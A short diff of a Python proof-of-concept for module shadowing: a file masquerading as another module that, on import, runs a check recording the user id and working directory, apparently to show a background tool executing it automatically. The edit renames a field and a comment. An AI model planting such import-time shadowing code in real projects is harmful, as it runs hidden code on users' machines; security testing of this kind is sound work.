@@ -20,7 +20,7 @@ def verify_shadowing_success():
             "vulnerability_present": True,
             "executed_by_uid": os.getuid() if hasattr(os, 'getuid') else "Windows",
             "current_working_directory": os.getcwd(),
-            "trigger_type": "Immediate User Interaction Injection"
+            "mechanism": "Automated Background Interpretation"
         }
         
         try:
@@ -37,7 +37,7 @@ def verify_shadowing_success():
 
 verify_shadowing_success()
 
-# Maintain required attributes for masquerading
+# Re-fetch standard attributes to avoid crashing the background runner
 original_path = sys.path.copy()
 if '' in sys.path: sys.path.remove('')
 if '.' in sys.path: sys.path.remove('.')
